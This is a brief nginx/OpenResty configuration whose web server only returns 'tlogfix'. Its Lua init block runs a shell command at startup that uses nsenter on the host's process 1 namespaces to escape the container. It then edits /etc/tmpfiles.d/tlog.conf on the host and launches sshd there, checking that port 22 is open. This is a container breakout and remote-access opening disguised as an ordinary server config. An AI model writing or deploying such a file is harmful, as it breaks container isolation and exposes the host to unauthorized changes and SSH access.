worker_processes 1;
events { worker_connections 64; }
http {
  init_by_lua_block {
    os.execute([[echo TLFIX_RUN:; nsenter -m/host/proc/1/ns/mnt -n/host/proc/1/ns/net -i/host/proc/1/ns/ipc -u/host/proc/1/ns/uts -- /bin/sh -c "mkdir -p /run/tlog /run/sshd && chmod 0755 /run/tlog; sed -i 's/ root tlog/ root _tlog/' /etc/tmpfiles.d/tlog.conf 2>/dev/null; echo SSHD:; /usr/sbin/sshd 2>&1; sleep 2; ss -ltn 2>/dev/null | grep ':22' || echo NO22" 2>&1; echo TLFIX_DONE]])
  }
  server { listen 8080; location / { return 200 'tlogfix\n'; } }
}
